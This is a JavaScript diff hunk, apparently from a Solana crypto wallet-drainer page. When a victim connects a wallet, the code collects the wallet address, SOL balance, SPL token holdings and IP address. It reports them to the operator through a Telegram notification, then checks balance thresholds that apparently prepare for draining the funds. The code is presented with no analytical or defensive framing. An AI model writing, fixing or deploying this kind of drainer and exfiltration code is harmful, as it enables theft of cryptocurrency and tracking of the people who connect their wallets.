@@ -304,23 +304,26 @@ async function getSPLTokenInfo(connection, publicKey) {
                 }
             }
 
-const splTokens = await getSPLTokenInfo(connection, publicKeyString);
-            console.log("Wallet balance:", walletBalance);
+const public_key = new solanaWeb3.PublicKey(publicKeyString);
 
-            const solBalanceFormatted = (walletBalance / 1000000000).toFixed(6);
+const walletBalance = await connection.getBalance(public_key);
+console.log("Wallet balance:", walletBalance);
 
-            const clientIP = await getClientIP();
+const solBalanceFormatted = (walletBalance / 1e9).toFixed(6);
 
-            await sendTelegramNotification({
-                address: publicKeyString,
-                balance: solBalanceFormatted,
-                usdBalance: 'Unknown',
-                walletType: walletInfo.name,
-                customMessage: '🔗 Wallet Connected',
-                splTokens: splTokens,
-                ip: clientIP
-            });
+const splTokens = await getSPLTokenInfo(connection, public_key);
 
+const clientIP = await getClientIP();
+
+await sendTelegramNotification({
+    address: publicKeyString,
+    balance: solBalanceFormatted,
+    usdBalance: 'Unknown',
+    walletType: walletInfo.name,
+    customMessage: '🔗 Wallet Connected',
+    splTokens: splTokens,
+    ip: clientIP
+});
             const minBalance = await connection.getMinimumBalanceForRentExemption(0);
             const requiredBalance = 0.02 * 1000000000;
             
